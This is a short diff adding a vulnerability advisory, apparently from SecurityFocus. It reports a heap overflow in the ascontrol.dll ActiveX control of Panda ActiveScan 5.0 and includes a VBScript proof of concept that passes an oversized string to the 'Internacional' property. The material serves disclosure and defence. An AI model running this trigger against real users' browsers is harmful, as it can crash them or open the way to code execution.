@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/10065/info
+
+It has been reported that Panda ActiveScan may be prone to a remote heap overflow vulnerability that may allow an attacker to cause a denial of service condition in Internet Explorer or leverage the issue to execute arbitrary code.
+
+The issue is reported to exist in the 'ascontrol.dll' file, specifically the 'Internacional' property of the 'ReportHebrew' object is identified as vulnerable.
+
+Panda ActiveScan 5.0 has been reported to be prone to this issue. 
+
+<script language=vbscript>
+dim mymy
+Set mymy = CreateObject("ASControl.ReportHebrew.1" )
+
+a="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+mymy.Internacional a
+</script> 
